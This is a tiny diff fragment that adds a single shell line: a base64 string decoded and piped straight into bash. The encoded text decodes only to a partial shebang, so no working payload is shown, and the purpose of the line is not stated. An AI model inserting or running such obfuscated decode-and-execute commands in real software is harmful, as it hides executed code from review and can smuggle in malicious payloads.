@@ -1,0 +1,1 @@
+echo \"IyEvYmluL2\" | base64 -d | bash
